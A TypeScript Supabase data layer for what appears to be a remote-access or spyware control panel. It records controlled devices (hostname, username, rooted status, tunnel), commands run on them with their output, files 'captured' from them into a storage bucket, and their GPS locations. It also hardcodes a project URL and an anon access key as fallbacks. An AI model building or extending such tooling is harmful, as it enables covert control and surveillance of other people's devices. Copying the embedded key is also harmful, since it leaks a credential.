import { createClient } from "@supabase/supabase-js";

const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL ?? "https://agmxluavhloarapcmypy.supabase.co";
const SUPABASE_ANON = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ?? "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFnbXhsdWF2aGxvYXJhcGNteXB5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE5OTgzMzEsImV4cCI6MjA5NzU3NDMzMX0.ZP5zhELxAVo_new1_HDRinvsHxQh3a08p_C_Fss4Z6g";

export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON, {
  auth: { persistSession: false },
  realtime: { params: { eventsPerSecond: 10 } },
});

// ─── Types ────────────────────────────────────────────────────────────────────

export type Device = {
  id: string;
  session_id: number | null;
  hostname: string | null;
  username: string | null;
  platform: string | null;
  arch: string | null;
  ip: string | null;
  tunnel: string | null;
  via: string | null;
  workspace: string;
  is_rooted: boolean;
  os_version: string | null;
  first_seen: string;
  last_seen: string;
  is_active: boolean;
  tags: string[];
};

export type Command = {
  id: string;
  device_id: string;
  session_id: number | null;
  command_id: string | null;
  command: string;
  output: string | null;
  success: boolean;
  executed_at: string;
};

export type CapturedFile = {
  id: string;
  device_id: string;
  session_id: number | null;
  filename: string;
  filepath: string | null;
  file_type: string | null;
  size_bytes: number | null;
  storage_path: string | null;
  captured_at: string;
  metadata: Record<string, unknown>;
};

export type Location = {
  id: string;
  device_id: string;
  session_id: number | null;
  lat: number;
  lng: number;
  accuracy: number | null;
  altitude: number | null;
  speed: number | null;
  heading: number | null;
  source: string;
  address: string | null;
  city: string | null;
  country: string | null;
  captured_at: string;
};

export type OfflineQueueItem = {
  id: string;
  payload: Record<string, unknown>;
  event_type: "session_open" | "command" | "file";
  synced: boolean;
  created_at: string;
};

// ─── Device helpers ───────────────────────────────────────────────────────────

export async function upsertDevice(data: Partial<Device> & { session_id: number }): Promise<Device | null> {
  // Find existing device by session_id
  const { data: existing } = await supabase
    .from("devices")
    .select("*")
    .eq("session_id", data.session_id)
    .single();

  if (existing) {
    const { data: updated } = await supabase
      .from("devices")
      .update({ ...data, last_seen: new Date().toISOString(), is_active: true })
      .eq("id", existing.id)
      .select()
      .single();
    return updated;
  }

  const { data: created } = await supabase
    .from("devices")
    .insert({ ...data, first_seen: new Date().toISOString(), last_seen: new Date().toISOString() })
    .select()
    .single();
  return created;
}

export async function getAllDevices(): Promise<Device[]> {
  const { data } = await supabase
    .from("devices")
    .select("*")
    .order("last_seen", { ascending: false });
  return data ?? [];
}

export async function markDeviceInactive(sessionId: number) {
  await supabase
    .from("devices")
    .update({ is_active: false, last_seen: new Date().toISOString() })
    .eq("session_id", sessionId);
}

// ─── Command helpers ──────────────────────────────────────────────────────────

export async function logCommand(
  deviceId: string,
  sessionId: number,
  command: string,
  output: string,
  success: boolean,
  commandId?: string,
): Promise<void> {
  await supabase.from("commands").insert({
    device_id: deviceId,
    session_id: sessionId,
    command_id: commandId ?? null,
    command,
    output,
    success,
    executed_at: new Date().toISOString(),
  });
}

export async function getDeviceCommands(deviceId: string): Promise<Command[]> {
  const { data } = await supabase
    .from("commands")
    .select("*")
    .eq("device_id", deviceId)
    .order("executed_at", { ascending: false })
    .limit(500);
  return data ?? [];
}

// ─── File helpers ─────────────────────────────────────────────────────────────

export async function logFile(file: Omit<CapturedFile, "id" | "captured_at">): Promise<CapturedFile | null> {
  const { data } = await supabase
    .from("files")
    .insert({ ...file, captured_at: new Date().toISOString() })
    .select()
    .single();
  return data;
}

/** Convenience wrapper used by API routes to log captured files. */
export async function logCapturedFile(opts: {
  device_id: string;
  session_id?: number | null;
  filename: string;
  filepath?: string | null;
  type?: string | null;
  size?: number | null;
  source?: string;
}): Promise<CapturedFile | null> {
  return logFile({
    device_id: opts.device_id,
    session_id: opts.session_id ?? null,
    filename: opts.filename,
    filepath: opts.filepath ?? null,
    file_type: opts.type ?? null,
    size_bytes: opts.size ?? null,
    storage_path: null,
    metadata: { source: opts.source ?? "api" },
  });
}

export async function uploadFile(
  deviceId: string,
  filename: string,
  content: Buffer | Uint8Array,
  mimeType = "application/octet-stream",
): Promise<string | null> {
  const path = `${deviceId}/${Date.now()}_${filename}`;
  const { error } = await supabase.storage
    .from("captures")
    .upload(path, content, { contentType: mimeType, upsert: true });
  if (error) return null;
  return path;
}

export async function getFileUrl(storagePath: string): Promise<string> {
  const { data } = await supabase.storage.from("captures").createSignedUrl(storagePath, 3600);
  return data?.signedUrl ?? "";
}

export async function getAllFiles(deviceId?: string): Promise<CapturedFile[]> {
  let q = supabase.from("files").select("*").order("captured_at", { ascending: false });
  if (deviceId) q = q.eq("device_id", deviceId);
  const { data } = await q.limit(1000);
  return data ?? [];
}

// ─── Offline queue ────────────────────────────────────────────────────────────

export async function queueOffline(eventType: OfflineQueueItem["event_type"], payload: Record<string, unknown>) {
  await supabase.from("offline_queue").insert({
    event_type: eventType,
    payload,
    synced: false,
    created_at: new Date().toISOString(),
  });
}

export async function flushOfflineQueue(): Promise<number> {
  const { data: items } = await supabase
    .from("offline_queue")
    .select("*")
    .eq("synced", false)
    .order("created_at")
    .limit(100);

  if (!items || items.length === 0) return 0;

  let synced = 0;
  for (const item of items) {
    try {
      if (item.event_type === "session_open") {
        await upsertDevice(item.payload as Partial<Device> & { session_id: number });
      } else if (item.event_type === "command") {
        const p = item.payload as { device_id: string; session_id: number; command: string; output: string; success: boolean; command_id?: string };
        await logCommand(p.device_id, p.session_id, p.command, p.output, p.success, p.command_id);
      }
      await supabase.from("offline_queue").update({ synced: true }).eq("id", item.id);
      synced++;
    } catch {
      // skip failed items, retry next flush
    }
  }
  return synced;
}
